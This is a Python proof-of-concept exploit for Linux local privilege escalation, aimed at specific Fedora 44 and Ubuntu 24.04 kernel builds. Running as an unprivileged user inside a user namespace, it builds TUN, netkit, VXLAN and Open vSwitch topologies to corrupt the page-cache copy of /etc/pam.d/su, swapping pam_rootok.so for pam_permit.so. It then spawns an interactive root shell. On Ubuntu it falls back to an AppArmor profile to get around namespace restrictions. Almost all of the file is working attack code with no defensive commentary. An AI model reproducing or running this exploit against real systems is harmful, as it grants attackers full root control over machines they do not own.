#!/usr/bin/env python3
from __future__ import annotations

import fcntl
import os
import socket
import struct
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path


PAM_TARGET = "/etc/pam.d/su"
PAM_ORIGINAL = b"pam_rootok.so"
PAM_REPLACEMENT = b"pam_permit.so"
WARMUP_COUNT = 1_024
ANCHORS_PER_GROUP = 8
RECYCLE_DRAIN = 16
HOLE_PACKET_LENGTH = 3_500
PIPE_GROUPS = 30
PIPES_PER_GROUP = 8
CONVERSION_PHASES = 5
CG_DRAIN_PAIRS = 128
CG_DRAIN_MESSAGES = 2
PIPE_SIZE = 262_144
F_SETPIPE_SZ = 1_031
PIPE_FLAGS_OFFSET = 24
VXLAN_HEADROOM = 64
IPV6_SOURCE_OFFSET = 8
CANDIDATE_PAGES = tuple(range(8, 17))

INTERNAL_ENV = "TUN_POC_INTERNAL"

TUNSETIFF = 0x400454CA
IFF_TUN = 0x0001
ETH_P_IPV6 = 0x86DD

RTM_NEWLINK = 16
NLM_F_REQUEST = 0x01
NLM_F_ACK = 0x04
NLM_F_EXCL = 0x200
NLM_F_CREATE = 0x400
NLMSG_ERROR = 2
IFLA_IFNAME = 3
IFLA_LINKINFO = 18
IFLA_INFO_KIND = 1
IFLA_INFO_DATA = 2
IFLA_NETKIT_MODE = 5
IFLA_NETKIT_HEADROOM = 8
NETKIT_L2 = 0

NLMSG_HDR = "IHHII"
GENL_HDR = "BBH"
NLA_HDR = "HH"
NETLINK_GENERIC = 16
GENL_ID_CTRL = 0x10
CTRL_CMD_GETFAMILY = 3
CTRL_ATTR_FAMILY_ID = 1
CTRL_ATTR_FAMILY_NAME = 2

OVS_DATAPATH_VERSION = 2
OVS_FLOW_VERSION = 1
OVS_VPORT_VERSION = 1
OVS_DP_CMD_NEW = 1
OVS_DP_ATTR_NAME = 1
OVS_DP_ATTR_UPCALL_PID = 2
OVS_VPORT_CMD_NEW = 1
OVS_VPORT_TYPE_NETDEV = 1
OVS_VPORT_ATTR_PORT_NO = 1
OVS_VPORT_ATTR_TYPE = 2
OVS_VPORT_ATTR_NAME = 3
OVS_VPORT_ATTR_UPCALL_PID = 5
OVS_FLOW_CMD_NEW = 1
OVS_FLOW_ATTR_KEY = 1
OVS_FLOW_ATTR_ACTIONS = 2
OVS_FLOW_ATTR_MASK = 7
OVS_KEY_ATTR_IN_PORT = 3
OVS_KEY_ATTR_ETHERTYPE = 6
OVS_KEY_ATTR_IPV6 = 8
OVS_ACTION_ATTR_OUTPUT = 1
OVS_ACTION_ATTR_SET_MASKED = 11


@dataclass(frozen=True)
class KernelRecord:
    distro: str
    release: str
    version: str
    machine: str
    trinity: bool


@dataclass
class GenericNetlink:
    sock: socket.socket
    sequence: int

    @classmethod
    def open(cls: type[GenericNetlink]) -> GenericNetlink:
        sock = socket.socket(
            socket.AF_NETLINK,
            socket.SOCK_RAW | socket.SOCK_CLOEXEC,
            NETLINK_GENERIC,
        )
        sock.bind((0, 0))
        return cls(sock, 1)

    def request(
        self,
        nlmsg_type: int,
        command: int,
        version: int,
        payload: bytes,
        flags: int,
    ) -> list[bytes]:
        sequence = self.sequence
        self.sequence += 1
        message = struct.pack(GENL_HDR, command, version, 0) + payload
        header = struct.pack(
            NLMSG_HDR,
            16 + len(message),
            nlmsg_type,
            flags,
            sequence,
            0,
        )
        self.sock.send(header + message)

        replies: list[bytes] = []
        while True:
            data = self.sock.recv(1 << 20)
            offset = 0
            while offset + 16 <= len(data):
                length, reply_type, _reply_flags, reply_sequence, _pid = (
                    struct.unpack_from(NLMSG_HDR, data, offset)
                )
                if length < 16 or length > len(data) - offset:
                    raise RuntimeError("invalid generic-netlink reply")
                body = data[offset + 16 : offset + length]
                offset += align4(length)
                if reply_sequence != sequence:
                    continue
                if reply_type == NLMSG_ERROR:
                    error = struct.unpack_from("i", body, 0)[0]
                    if error == 0:
                        return replies
                    raise OSError(-error, os.strerror(-error))
                replies.append(body)
            if replies and not flags & NLM_F_ACK:
                return replies

    def family(self, name: str) -> int:
        replies = self.request(
            GENL_ID_CTRL,
            CTRL_CMD_GETFAMILY,
            2,
            nla(CTRL_ATTR_FAMILY_NAME, cstr(name)),
            NLM_F_REQUEST,
        )
        for reply in replies:
            for attr_type, payload in parse_attrs(reply[4:]):
                if attr_type == CTRL_ATTR_FAMILY_ID:
                    return struct.unpack_from("H", payload, 0)[0]
        raise RuntimeError(f"generic-netlink family not found: {name}")


@dataclass
class Topology:
    tun_fd: int
    genl: GenericNetlink
    flow_family: int
    datapath_ifindex: int


KERNELS = (
    KernelRecord(
        "Fedora Linux 44 (Server Edition)",
        "6.19.10-300.fc44.x86_64",
        "#1 SMP PREEMPT_DYNAMIC Wed Mar 25 18:23:49 UTC 2026",
        "x86_64",
        False,
    ),
    KernelRecord(
        "Ubuntu 24.04.4 LTS",
        "6.17.0-40-generic",
        "#40~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Tue Jun 23 16:48:12 UTC 2",
        "x86_64",
        True,
    ),
)


def step(message: str) -> None:
    print(f"\n***{message}***", flush=True)


def align4(value: int) -> int:
    return (value + 3) & ~3


def nla(attr_type: int, payload: bytes) -> bytes:
    length = 4 + len(payload)
    return (
        struct.pack(NLA_HDR, length, attr_type)
        + payload
        + b"\x00" * (align4(length) - length)
    )


def cstr(value: str) -> bytes:
    return value.encode("ascii") + b"\x00"


def parse_attrs(data: bytes) -> list[tuple[int, bytes]]:
    attrs: list[tuple[int, bytes]] = []
    offset = 0
    while offset + 4 <= len(data):
        length, attr_type = struct.unpack_from(NLA_HDR, data, offset)
        if length < 4 or length > len(data) - offset:
            break
        attrs.append((attr_type, data[offset + 4 : offset + length]))
        offset += align4(length)
    return attrs


def run(command: list[str]) -> None:
    subprocess.run(
        command,
        check=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def open_tun(name: str) -> int:
    fd = os.open("/dev/net/tun", os.O_RDWR | os.O_CLOEXEC)
    request = struct.pack("16sH22x", name.encode("ascii"), IFF_TUN)
    fcntl.ioctl(fd, TUNSETIFF, request)
    return fd


def create_netkit(name: str, headroom: int) -> None:
    ifinfo = struct.pack("=BBHiII", socket.AF_UNSPEC, 0, 0, 0, 0, 0xFFFFFFFF)
    info_data = (
        nla(IFLA_NETKIT_MODE, struct.pack("I", NETKIT_L2))
        + nla(IFLA_NETKIT_HEADROOM, struct.pack("H", headroom))
    )
    linkinfo = nla(IFLA_INFO_KIND, cstr("netkit")) + nla(IFLA_INFO_DATA, info_data)
    payload = ifinfo + nla(IFLA_IFNAME, cstr(name)) + nla(IFLA_LINKINFO, linkinfo)
    header = struct.pack(
        NLMSG_HDR,
        16 + len(payload),
        RTM_NEWLINK,
        NLM_F_REQUEST | NLM_F_ACK | NLM_F_EXCL | NLM_F_CREATE,
        1,
        0,
    )
    sock = socket.socket(
        socket.AF_NETLINK,
        socket.SOCK_RAW | socket.SOCK_CLOEXEC,
        socket.NETLINK_ROUTE,
    )
    try:
        sock.send(header + payload)
        reply = sock.recv(65_535)
    finally:
        sock.close()
    if len(reply) < 20 or struct.unpack_from("H", reply, 4)[0] != NLMSG_ERROR:
        raise RuntimeError("invalid rtnetlink reply")
    error = struct.unpack_from("i", reply, 16)[0]
    if error:
        raise OSError(-error, os.strerror(-error))


def create_datapath(genl: GenericNetlink, family: int, name: str) -> None:
    payload = (
        struct.pack("i", 0)
        + nla(OVS_DP_ATTR_NAME, cstr(name))
        + nla(OVS_DP_ATTR_UPCALL_PID, struct.pack("I", 0))
    )
    genl.request(
        family,
        OVS_DP_CMD_NEW,
        OVS_DATAPATH_VERSION,
        payload,
        NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE,
    )


def create_vport(
    genl: GenericNetlink,
    family: int,
    datapath_ifindex: int,
    name: str,
    port: int,
) -> None:
    payload = (
        struct.pack("i", datapath_ifindex)
        + nla(OVS_VPORT_ATTR_PORT_NO, struct.pack("I", port))
        + nla(OVS_VPORT_ATTR_TYPE, struct.pack("I", OVS_VPORT_TYPE_NETDEV))
        + nla(OVS_VPORT_ATTR_NAME, cstr(name))
        + nla(OVS_VPORT_ATTR_UPCALL_PID, struct.pack("I", 0))
    )
    genl.request(
        family,
        OVS_VPORT_CMD_NEW,
        OVS_VPORT_VERSION,
        payload,
        NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE,
    )


def flow_key() -> tuple[bytes, bytes]:
    key = (
        nla(OVS_KEY_ATTR_IN_PORT, struct.pack("I", 1))
        + nla(OVS_KEY_ATTR_ETHERTYPE, struct.pack("!H", ETH_P_IPV6))
        + nla(OVS_KEY_ATTR_IPV6, b"\x00" * 40)
    )
    mask = (
        nla(OVS_KEY_ATTR_IN_PORT, struct.pack("I", 0xFFFFFFFF))
        + nla(OVS_KEY_ATTR_ETHERTYPE, struct.pack("!H", 0xFFFF))
        + nla(OVS_KEY_ATTR_IPV6, b"\x00" * 40)
    )
    return key, mask


def create_flow(topology: Topology, actions: bytes) -> None:
    key, mask = flow_key()
    payload = (
        struct.pack("i", topology.datapath_ifindex)
        + nla(OVS_FLOW_ATTR_KEY, key)
        + nla(OVS_FLOW_ATTR_MASK, mask)
        + nla(OVS_FLOW_ATTR_ACTIONS, actions)
    )
    topology.genl.request(
        topology.flow_family,
        OVS_FLOW_CMD_NEW,
        OVS_FLOW_VERSION,
        payload,
        NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE,
    )


def new_topology(
    tun_fd: int,
    datapath: str,
    ports: tuple[str, ...],
    mtu: int | None = None,
) -> Topology:
    genl = GenericNetlink.open()
    datapath_family = genl.family("ovs_datapath")
    vport_family = genl.family("ovs_vport")
    flow_family = genl.family("ovs_flow")
    create_datapath(genl, datapath_family, datapath)
    datapath_ifindex = socket.if_nametoindex(datapath)
    if mtu is not None:
        run(["/usr/sbin/ip", "link", "set", datapath, "mtu", str(mtu)])
    for port_number, name in enumerate(ports, 1):
        create_vport(genl, vport_family, datapath_ifindex, name, port_number)
    return Topology(tun_fd, genl, flow_family, datapath_ifindex)


def setup_factory(prefix: str) -> tuple[int, int, Topology]:
    input_name = f"{prefix}in"
    output_name = f"{prefix}out"
    datapath_name = f"{prefix}dp"
    input_fd = open_tun(input_name)
    output_fd = open_tun(output_name)
    run(["/usr/sbin/ip", "link", "set", input_name, "mtu", "4000"])
    run(["/usr/sbin/ip", "link", "set", output_name, "mtu", "4000"])
    run(["/usr/sbin/ip", "link", "set", input_name, "up"])
    run(["/usr/sbin/ip", "link", "set", output_name, "txqueuelen", "8192"])
    run(["/usr/sbin/ip", "link", "set", output_name, "up"])
    topology = new_topology(
        input_fd,
        datapath_name,
        (input_name, output_name),
        4_000,
    )
    create_flow(topology, nla(OVS_ACTION_ATTR_OUTPUT, struct.pack("I", 2)))
    return input_fd, output_fd, topology


def masked_ipv6_action(value: bytes) -> bytes:
    field = value + b"\x00" * (40 - len(value))
    mask = b"\xff" * len(value) + b"\x00" * (40 - len(value))
    return nla(
        OVS_ACTION_ATTR_SET_MASKED,
        nla(OVS_KEY_ATTR_IPV6, field + mask),
    )


def setup_exploit(index: int, pages: int) -> Topology:
    tun_name = f"ei{index}"
    netkit_name = f"en{index}"
    vxlan_name = f"ev{index}"
    datapath_name = f"ed{index}"
    local = f"172.{77 + index}.0.1"
    tun_fd = open_tun(tun_name)
    run(["/usr/sbin/ip", "link", "set", tun_name, "up"])
    create_netkit(
        netkit_name,
        pages * 4_096
        + PIPE_FLAGS_OFFSET
        - VXLAN_HEADROOM
        - IPV6_SOURCE_OFFSET,
    )
    run(["/usr/sbin/ip", "addr", "add", f"{local}/24", "dev", netkit_name])
    run(["/usr/sbin/ip", "link", "set", netkit_name, "up"])
    run(
        [
            "/usr/sbin/ip",
            "link",
            "add",
            vxlan_name,
            "type",
            "vxlan",
            "id",
            str(3_777 + index),
            "local",
            local,
            "dev",
            netkit_name,
            "dstport",
            "4789",
        ]
    )
    run(["/usr/sbin/ip", "link", "set", vxlan_name, "up"])
    topology = new_topology(
        tun_fd,
        datapath_name,
        (tun_name, vxlan_name),
    )
    create_flow(topology, masked_ipv6_action(b"\x10"))
    return topology


def ipv6_packet(length: int) -> bytes:
    payload_length = length - 40
    source = socket.inet_pton(socket.AF_INET6, "2001:db8::2")
    destination = socket.inet_pton(socket.AF_INET6, "2001:db8::1")
    header = struct.pack(
        "!IHBB16s16s",
        6 << 28,
        payload_length,
        59,
        64,
        source,
        destination,
    )
    return struct.pack("!HH", 0, ETH_P_IPV6) + header + b"A" * payload_length


def create_cg_drain() -> list[tuple[socket.socket, socket.socket]]:
    drain: list[tuple[socket.socket, socket.socket]] = []
    for _index in range(CG_DRAIN_PAIRS):
        sender, receiver = socket.socketpair(socket.AF_UNIX, socket.SOCK_DGRAM)
        drain.append((sender, receiver))
    return drain


def fill_cg_drain(
    drain: list[tuple[socket.socket, socket.socket]],
    packet: bytes,
) -> None:
    for sender, _receiver in drain:
        for _message in range(CG_DRAIN_MESSAGES):
            if sender.send(packet) != len(packet):
                raise RuntimeError("short cache-drain datagram")


def build_pipe_groups(
    anchor_input: int,
    target_fd: int,
    target_offset: int,
    packet: bytes,
) -> list[list[tuple[int, int]]]:
    pipe_groups: list[list[tuple[int, int]]] = []
    for group_index in range(PIPE_GROUPS):
        for _index in range(ANCHORS_PER_GROUP):
            if os.write(anchor_input, packet) != len(packet):
                raise RuntimeError("short anchor TUN write")
        pipes: list[tuple[int, int]] = []
        for _index in range(PIPES_PER_GROUP):
            read_fd, write_fd = os.pipe2(os.O_CLOEXEC)
            fcntl.fcntl(write_fd, F_SETPIPE_SZ, PIPE_SIZE)
            if os.splice(target_fd, write_fd, 1, target_offset - 1) != 1:
                raise RuntimeError("short splice into pipe")
            pipes.append((read_fd, write_fd))
        pipe_groups.append(pipes)
        if group_index + 1 < PIPE_GROUPS:
            for _index in range(ANCHORS_PER_GROUP):
                if os.write(anchor_input, packet) != len(packet):
                    raise RuntimeError("short separator TUN write")
    return pipe_groups


def try_pipe_groups(
    pipe_groups: list[list[tuple[int, int]]],
    warmup_input: int,
    anchor_output: int,
    exploits: list[Topology],
    hole_packet: bytes,
) -> bool:
    trigger_packet = ipv6_packet(52)
    for group_index, pipes in enumerate(pipe_groups):
        if group_index:
            for _index in range(ANCHORS_PER_GROUP):
                os.read(anchor_output, 65_535)
            for _index in range(RECYCLE_DRAIN):
                if os.write(warmup_input, hole_packet) != len(hole_packet):
                    raise RuntimeError("short recycle-drain TUN write")
        for _index in range(ANCHORS_PER_GROUP):
            os.read(anchor_output, 65_535)
        for exploit in exploits:
            if os.write(exploit.tun_fd, trigger_packet) != len(trigger_packet):
                raise RuntimeError("short exploit TUN write")
        for _read_fd, write_fd in pipes:
            if os.write(write_fd, PAM_REPLACEMENT) != len(PAM_REPLACEMENT):
                raise RuntimeError("short pipe write")
            if PAM_REPLACEMENT in Path(PAM_TARGET).read_bytes():
                return True
    return False


def close_pipe_groups(pipe_groups: list[list[tuple[int, int]]]) -> None:
    for pipes in pipe_groups:
        for read_fd, write_fd in pipes:
            os.close(read_fd)
            os.close(write_fd)


def convert(
    warmup_input: int,
    anchor_input: int,
    anchor_output: int,
    exploits: list[Topology],
    hole_packet: bytes,
) -> int:
    target_offset = Path(PAM_TARGET).read_bytes().index(PAM_ORIGINAL)
    target_fd = os.open(PAM_TARGET, os.O_RDONLY | os.O_CLOEXEC)
    cg_drain = create_cg_drain()

    for _phase in range(CONVERSION_PHASES):
        for _index in range(WARMUP_COUNT):
            if os.write(warmup_input, hole_packet) != len(hole_packet):
                raise RuntimeError("short warmup TUN write")
        fill_cg_drain(cg_drain, hole_packet)
        pipe_groups = build_pipe_groups(
            anchor_input,
            target_fd,
            target_offset,
            hole_packet,
        )
        if try_pipe_groups(
            pipe_groups,
            warmup_input,
            anchor_output,
            exploits,
            hole_packet,
        ):
            return 0
        close_pipe_groups(pipe_groups)
    return 1


def internal_attempt() -> int:
    os.sched_setaffinity(0, {0})
    run(["/usr/sbin/ip", "link", "set", "lo", "up"])
    warmup_input, _warmup_output, _warmup = setup_factory("wf")
    anchor_input, anchor_output, _anchor = setup_factory("af")
    exploits = [
        setup_exploit(index, pages)
        for index, pages in enumerate(CANDIDATE_PAGES)
    ]

    hole_packet = ipv6_packet(HOLE_PACKET_LENGTH)

    return convert(
        warmup_input,
        anchor_input,
        anchor_output,
        exploits,
        hole_packet,
    )


def os_release() -> dict[str, str]:
    try:
        lines = Path("/etc/os-release").read_text(encoding="utf-8").splitlines()
    except OSError:
        return {}

    values: dict[str, str] = {}
    for line in lines:
        key, separator, value = line.partition("=")
        if not separator:
            continue
        value = value.strip()
        if len(value) >= 2 and value[0] == value[-1] and value[0] in "\"'":
            value = value[1:-1]
        values[key] = value
    return values


def current_kernel() -> KernelRecord:
    uname = os.uname()
    release = os_release()
    return KernelRecord(
        release.get("PRETTY_NAME", "Unknown distribution"),
        uname.release,
        uname.version,
        uname.machine,
        release.get("ID") == "ubuntu",
    )


def describe(record: KernelRecord) -> str:
    return f"{record.distro}, kernel {record.release} ({record.machine})"


def direct_user_namespace_available() -> bool:
    result = subprocess.run(
        ["/usr/bin/unshare", "-Urn", "/usr/bin/true"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )
    return result.returncode == 0


def run_attempt(record: KernelRecord) -> int:
    environment = os.environ.copy()
    environment[INTERNAL_ENV] = "1"
    child = [sys.executable, str(Path(__file__).resolve())]
    command = ["/usr/bin/unshare", "-Urn", *child]
    if record.trinity:
        if direct_user_namespace_available():
            print("namespace: direct unshare -Urn works", flush=True)
        else:
            print(
                "namespace: direct unshare -Urn denied; using aa-exec -p trinity",
                flush=True,
            )
            command = ["/usr/bin/aa-exec", "-p", "trinity", "--", *command]
    return subprocess.run(command, env=environment, check=False).returncode


def main() -> int:
    record = current_kernel()
    if record not in KERNELS:
        raise RuntimeError("distro/kernel build does not match either tested target")
    if os.environ.get(INTERNAL_ENV) == "1":
        return internal_attempt()
    if os.geteuid() == 0:
        raise RuntimeError("run this PoC as an ordinary unprivileged user")

    step("CHECKING TARGET")
    print(f"target: {describe(record)}", flush=True)
    target = Path(PAM_TARGET).read_bytes()
    if PAM_REPLACEMENT in target:
        raise RuntimeError(f"{PAM_TARGET} is already modified")
    if PAM_ORIGINAL not in target:
        raise RuntimeError(f"expected PAM module is absent from {PAM_TARGET}")

    step("BEGINNING ROOT CONVERSION")
    if run_attempt(record) != 0:
        raise RuntimeError("root conversion did not land")
    if PAM_REPLACEMENT not in Path(PAM_TARGET).read_bytes():
        raise RuntimeError("conversion child reported success without a root-owned write")

    step("SPAWNING INTERACTIVE ROOT SHELL")
    os.execv("/usr/bin/su", ["su", "-", "root"])


if __name__ == "__main__":
    raise SystemExit(main())
